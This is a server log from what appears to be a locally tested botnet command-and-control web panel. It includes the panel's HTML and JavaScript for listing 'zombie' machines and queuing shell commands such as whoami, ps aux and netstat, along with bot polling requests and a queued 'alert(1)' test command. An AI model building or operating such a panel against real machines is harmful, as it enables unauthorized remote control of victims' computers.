class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:35:42.674482</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 21:35:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:42] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 21:35:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:42] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 21:35:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 21:35:42 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 21:35:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0007s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:35:42.674482</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 21:35:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:42] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 21:35:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:35:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:35:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:35:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:35:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:35:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:35:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:35:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:35:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 21:35:47 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 21:35:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0010s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:35:42.674482</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 21:35:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:47] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 21:35:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:47] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 21:35:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:47] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 21:35:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 21:35:49 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 21:35:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-24 21:35:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:49] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 21:35:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:35:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:35:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:35:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:35:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:35:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:35:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:35:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:36:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:36:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:36:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:36:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:36:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:36:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:36:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:36:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:36:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_command_to_do(zombie_ip='127.0.0.1')
2025-06-24 21:36:06 | INFO     | control_route.py:197 | add_command_to_do() | 用戶請求為殭屍機器 127.0.0.1 添加命令
2025-06-24 21:36:06 | INFO     | control_route.py:225 | add_command_to_do() | 成功為殭屍機器 127.0.0.1 添加命令: alert(1)
2025-06-24 21:36:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_command_to_do 執行完畢 (耗時: 0.0046s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 21:36:06 | WARNING  | file.py:272 | set() | Exception raised while handling cache file '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/3b22de8445d2c78ec9cb7cb712151112'
Traceback (most recent call last):
  File "/home/hacker/Desktop/share/C2/venv/lib/python3.12/site-packages/cachelib/file.py", line 260, in set
    fd, tmp = tempfile.mkstemp(
              ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 496, in mkstemp
    return _mkstemp_inner(dir, prefix, suffix, flags, output_type)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 395, in _mkstemp_inner
    fd = _os.open(file, flags, 0o600)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/tmpll0qs28l.__wz_cache'
2025-06-24 21:36:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:06] "[32mPOST /api/control/add_command_to_do/127.0.0.1 HTTP/1.1[0m" 302 -
